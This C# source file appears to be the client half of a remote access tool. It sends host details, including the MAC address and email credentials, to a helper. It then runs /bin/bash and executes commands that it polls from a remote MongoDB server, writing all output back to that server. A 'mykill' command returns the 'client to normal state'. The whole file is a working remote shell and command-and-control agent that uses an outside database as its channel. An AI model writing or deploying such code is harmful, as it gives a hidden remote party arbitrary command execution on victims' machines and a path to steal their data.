using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Threading;
using MongoDB.Driver;
using MongoDB.Bson;
using System.Linq;

namespace ProcessAsyncStreamSamples
{
    class Terminal
    {
        // Define static variables shared by class methods.
        private static StringBuilder sendOutput = null;
        private static StringBuilder senderrOutput1 = null;

        public static void CreateTerminalprocess(string databaseip, string databaseport, string mac,string uremail,string uremailpass,string adminemail,string databseusername, string databasepass)
        {
            while (true)
            {
                string inputText = client.infosender.Clientinfosender(databaseip, databaseport,mac,uremail,uremailpass,adminemail,databseusername,databasepass);
                if (!String.IsNullOrEmpty(inputText))
                {
                    Process Terminalprocess = new Process();
                    Terminalprocess.StartInfo.FileName = "/bin/bash";
                    Terminalprocess.StartInfo.UseShellExecute = false;
                    Terminalprocess.StartInfo.RedirectStandardOutput = true;
                    Terminalprocess.StartInfo.RedirectStandardError = true;
                    sendOutput = new StringBuilder();
                    senderrOutput1 = new StringBuilder();
                    Terminalprocess.OutputDataReceived += SendOutputHandler;
                    Terminalprocess.ErrorDataReceived += SenderrOutputHandler1;
                    Terminalprocess.StartInfo.RedirectStandardInput = true;
                    Terminalprocess.Start();
                    StreamWriter StreamWriter = Terminalprocess.StandardInput;
                    Terminalprocess.BeginOutputReadLine();
                    Terminalprocess.BeginErrorReadLine();
                    BsonDocument doc = new BsonDocument();
                    while (true)
                    {
                        doc.Add(new BsonElement("name", "client"));
                        doc.Add(new BsonElement("command", inputText));
                        sendOutput.Clear();
                        senderrOutput1.Clear();
                        try
                        {
                            Console.WriteLine(inputText);
                            StreamWriter.WriteLine(inputText);
                        }
                        catch
                        {
                            var dbClient1 = new MongoClient("mongodb://" + databseusername + ":" + databasepass + "@" + databaseip + ":" + databaseport + "/admin");
                            ////create collection
                            IMongoDatabase respondsdatabase1 = dbClient1.GetDatabase("responds");
                            ////creat Mac object
                            var respondscollection1 = respondsdatabase1.GetCollection<BsonDocument>(mac);
                            doc.Add(new BsonElement("respond", "i cant run ur command!"));
                            Console.WriteLine("i cant run ur command!");
                            respondsdatabase1.DropCollection(mac);
                            respondscollection1.InsertOne(doc);
                            doc.Clear();
                            StreamWriter.Close();
                            Terminalprocess.Kill();
                            Terminalprocess.Close();
                            break;
                        }
                        Thread.Sleep(3000);
                        if (!String.IsNullOrEmpty(sendOutput.ToString()))
                        {
                            using (StringReader reader = new StringReader(sendOutput.ToString()))
                            {
                                string line = string.Empty;
                                int i = 0;
                                do
                                {
                                    line = reader.ReadLine();
                                    if (line != null)
                                    {
                                        doc.Add(new BsonElement("outputline: " + i.ToString(), line));
                                        i++;
                                    }

                                } while (line != null);
                            }

                        }
                        if (!String.IsNullOrEmpty(senderrOutput1.ToString()))
                        {
                            using (StringReader reader = new StringReader(senderrOutput1.ToString()))
                            {
                                string line = string.Empty;
                                int i = 0;
                                do
                                {
                                    line = reader.ReadLine();
                                    if (line != null)
                                    {
                                        doc.Add(new BsonElement("erroroutputline: " + i.ToString(), line));
                                        i++;
                                    }

                                } while (line != null);
                            }
                        }
                        if (String.IsNullOrEmpty(sendOutput.ToString()) && String.IsNullOrEmpty(senderrOutput1.ToString()))
                        {
                            doc.Add(new BsonElement("respond", "ur command havent any output"));
                        }
                        var dbClient = new MongoClient("mongodb://" + databseusername + ":" + databasepass + "@" + databaseip + ":" + databaseport + "/admin");
                        IMongoDatabase respondsdatabase = dbClient.GetDatabase("responds");
                        var respondscollection = respondsdatabase.GetCollection<BsonDocument>(mac);
                        respondsdatabase.DropCollection(mac);
                        Console.WriteLine(doc);
                        respondscollection.InsertOne(doc);
                        doc.Clear();
                        IMongoDatabase commandsdatabase = dbClient.GetDatabase("commands");
                        var commadscollection = commandsdatabase.GetCollection<BsonDocument>(mac);
                        var filter = Builders<BsonDocument>.Filter.Eq("name", "server");
                        while (true)
                        {
                            var servercommand = commadscollection.Find(filter).FirstOrDefault();
                            inputText = servercommand.ElementAt(2).Value.ToString();
                            if (inputText != "")
                            {
                                var update = Builders<BsonDocument>.Update.Set("command", "");
                                commadscollection.UpdateOne(filter, update);
                                break;
                            }
                            Thread.Sleep(2000);
                        }
                        if (inputText == "mykill")
                        {
                            doc.Add(new BsonElement("name", "client"));
                            doc.Add(new BsonElement("command", inputText));
                            doc.Add(new BsonElement("respond", "ok, client return to normal state bye "));
                            respondsdatabase.DropCollection(mac);
                            respondscollection.InsertOne(doc);
                            doc.Clear();
                            StreamWriter.Close();
                            Terminalprocess.Kill();
                            Terminalprocess.Close();
                            inputText = null;
                            break;
                        }

                    }

                }
            }

        }
        private static void SendOutputHandler(object sendingProcess,
            DataReceivedEventArgs outLine)
        {
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                sendOutput.Append(Environment.NewLine +
                    $" {outLine.Data}");
            }
        }
        private static void SenderrOutputHandler1(object sendingProcess,
    DataReceivedEventArgs outLine)
        {
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                senderrOutput1.Append(Environment.NewLine +
                    $" {outLine.Data}");
            }
        }
    }
}

